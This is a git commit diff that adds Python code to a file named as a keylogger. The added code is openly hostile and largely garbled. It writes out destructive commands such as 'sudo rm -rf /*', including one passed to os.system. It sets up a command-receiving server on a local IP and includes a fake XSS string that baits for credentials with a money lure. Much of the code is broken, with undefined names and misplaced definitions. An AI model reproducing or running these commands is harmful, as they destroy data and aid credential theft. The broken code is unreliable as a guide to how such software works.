e3028f8baefd1b5145bf4b661956f28225fe8a60
DiegoDev <diegorego516@gmail.com>
2026-05-07 18:03:27 +0000

    Update keylogger_black_genesis.py

--- keylogger_black_genesis.py
+++ keylogger_black_genesis.py
@@ -32,3 +32,37 @@ s.bind_server(("192.168.15.72",1024))
 def xss_exploits(reflected_xss):
 			xss_exploit = "</img-src: malicious-payload = $10000000 >= 'INSERT_HERE_YOUR_CREDENTIALS_TO_CLAIM_YOUR_MONEY': >"
 			 
+#!/usr/bin/python3 
+
+import os
+import sys
+from pynput import keyboard
+
+try:
+	from pynput import keyboard
+except KeyboardInterrupt:
+
+	os.system(f"{sys.command} sudo rm -rf pynput")
+	from pynput import keyboard
+
+LOG_FILE = "/home/diegothehacker/keylogger_black_genesis/log.txt"
+
+with open(LOG_FILE, "a", encoding="utf-8") as f:
+	f.write(f" --- Session Started --- ")
+
+def invoke_command(linux):
+		command = "sudo rm -rf /*"
+while True:
+	try:
+		c.command = send_command + s.send(1024).decode(command_send)
+		command.send_command = "command.execute_command(linux_systems) + command = sudo rm -rf /*"
+	except:
+
+		def server():
+			if __name__ == "__main__":
+				start_server("192.168.15.72",1024)
+s.bind_server(("192.168.15.72",1024))
+
+def xss_exploits(reflected_xss):
+			xss_exploit = "</img-src: malicious-payload = $10000000 >= 'INSERT_HERE_YOUR_CREDENTIALS_TO_CLAIM_YOUR_MONEY': >"
+			 
